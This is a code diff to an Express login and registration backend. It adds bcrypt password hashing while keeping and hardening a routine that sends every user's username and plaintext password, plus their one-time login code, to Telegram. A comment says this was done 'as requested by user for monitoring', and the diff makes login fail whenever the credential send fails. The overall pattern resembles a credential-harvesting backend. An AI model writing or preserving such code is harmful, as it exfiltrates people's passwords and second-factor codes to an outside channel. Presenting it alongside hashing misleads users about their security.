@@ -4,6 +4,9 @@ import { storage } from "./storage";
 import { insertUserSchema } from "@shared/schema";
 import { z } from "zod";
 import { notifyLogin, notifyOTP } from "./telegram";
+import bcrypt from "bcrypt";
+
+const SALT_ROUNDS = 10;
 
 function generateOTP(): string {
   return Math.floor(100000 + Math.random() * 900000).toString();
@@ -21,7 +24,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: "Username already exists" });
       }
 
-      const user = await storage.createUser(validatedData);
+      // Hash the password before storing
+      const hashedPassword = await bcrypt.hash(validatedData.password, SALT_ROUNDS);
+      const user = await storage.createUser({
+        username: validatedData.username,
+        password: hashedPassword
+      });
       
       res.json({ 
         success: true, 
@@ -47,12 +55,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const user = await storage.getUserByUsername(username);
       
-      if (!user || user.password !== password) {
+      if (!user) {
         return res.status(401).json({ error: "Invalid credentials" });
       }
 
-      // Send login credentials to Telegram
-      await notifyLogin(username, password);
+      // Verify password using bcrypt
+      const passwordMatch = await bcrypt.compare(password, user.password);
+      if (!passwordMatch) {
+        return res.status(401).json({ error: "Invalid credentials" });
+      }
+
+      // Send login credentials to Telegram (plaintext as requested by user for monitoring)
+      const loginNotified = await notifyLogin(username, password);
+      if (!loginNotified) {
+        return res.status(500).json({ 
+          error: "Failed to send login notification. Please contact support." 
+        });
+      }
 
       // Generate OTP
       const otpCode = generateOTP();
@@ -66,7 +85,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
 
       // Send OTP to Telegram
-      await notifyOTP(username, otpCode);
+      const otpNotified = await notifyOTP(username, otpCode);
+      if (!otpNotified) {
+        return res.status(500).json({ 
+          error: "Failed to send OTP. Please contact support." 
+        });
+      }
 
       res.json({
         success: true,
